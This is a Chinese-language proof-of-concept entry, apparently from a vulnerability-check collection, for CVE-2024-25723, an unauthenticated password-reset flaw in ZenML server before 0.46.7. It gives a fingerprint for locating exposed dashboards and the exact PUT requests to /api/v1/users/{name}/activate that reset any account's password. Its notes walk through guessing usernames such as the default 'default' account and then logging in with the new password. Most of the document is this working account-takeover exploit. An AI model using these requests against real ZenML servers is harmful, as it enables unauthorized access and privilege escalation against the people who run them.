﻿# ZenML 任意用户密码修改漏洞

> 更新时间：2024-05-14

> 漏洞编号：CVE-2024-25723

> 漏洞说明：ZenML服务器远程权限提升漏洞（CVE-2024-25723）存在于Python的0.46.7之前的ZenML机器学习包中的ZenML服务,漏洞源于/*/{user_name_or_id}/activate REST API 端点允许基于有效用户名和请求正文中的新密码进行访问，可导致未授权用户远程权限提升，可直接重置任意ZenML账户密码。

> 漏洞特征：title=="ZenML - Dashboard"

> 验证脚本：HTTP

```
PUT /api/v1/users/admin/activate HTTP/1.1
Content-Type: application/json

{"password": "dudesite@123"}
```

> 响应代码特征：200

> 响应内容特征：updated

> 上传文件定位：

> 验证文件来源：ZenML 任意用户密码修改漏洞.poc

```
备注说明：
1、该漏洞前提得知道用户名，爆破用户名即可。默认会存在default
PUT /api/v1/users/default/activate HTTP/1.1
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Type: application/json

{"password": "dudesite@123"}
2、替换为已知的用户名（例：admin、test）或用户Id（随机uuid），发送请求，重置该用户的密码
PUT /api/v1/users/{userName_or_userId}/activate HTTP/1.1
Content-Type: application/json

{"password": "dudesite@123"}
3、如果使用的是用户Id重置密码，查看请求返回的内容，内容中的name即为登录账号
4、使用账号、修改后的密码即可登录系统
```